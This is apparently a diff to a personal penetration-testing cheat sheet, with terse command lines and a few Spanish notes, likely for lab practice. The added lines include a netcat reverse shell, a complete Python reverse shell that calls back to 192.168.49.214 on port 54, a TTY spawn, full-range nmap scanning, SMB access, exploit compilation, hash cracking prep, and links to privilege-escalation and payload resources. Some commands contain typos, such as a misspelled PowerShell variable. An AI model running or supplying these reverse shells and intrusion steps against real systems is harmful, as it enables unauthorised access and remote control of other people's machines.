@@ -19,3 +19,31 @@ iptables --list
 route -n
 
 tcpdump -i tun0 -icmp -n
+
+fuser 8080/tcp
+fuser -k 80/tcp
+
+rlwrap
+
+sqsh to login myssql with sort sqlshell --podemos ejecutar lo que queramos---podemos subir
+
+tcpdump -i tun0 -icmp -n
+
+rar2john
+shutdown -r
+
+medium
+nmap -Pn -n -v -p- -T4 ip --open
+powershell $ExecutionContent.SsessionState.LanguageMode
+smbclient  \\\\192.168.199.64\\zino
+nc ip port -e /bin/bash
+https://github.com/diego-treitos/linux-smart-enumeration
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.214",54));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import pty; pty.spawn("/bin/bash")'
+dpkg --list | grep cup
+CAT /etc/issue
+gcc 15704.c -o 15
+
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+https://reconshell.com/efspotato-local-privalege-escalation-vulnerability/
+
